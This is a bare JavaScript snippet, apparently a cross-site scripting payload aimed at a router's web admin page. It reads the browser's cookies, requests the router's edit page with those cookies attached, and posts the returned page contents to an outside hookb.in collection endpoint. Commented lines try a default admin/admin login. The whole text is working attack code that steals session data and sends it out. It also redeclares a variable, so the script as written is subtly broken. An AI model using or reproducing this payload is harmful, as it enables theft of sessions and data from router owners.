const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
const cook = document.cookie;
http.open('GET', 'http://router.local/home.php?action=edit&'+cook, true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/b90xzEqn8qtKGq00yE6E', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));

};
const cook = document.cookie;
http.send();
//http.send(cook+"&username=admin&pin=admin&notRobot=on");

   

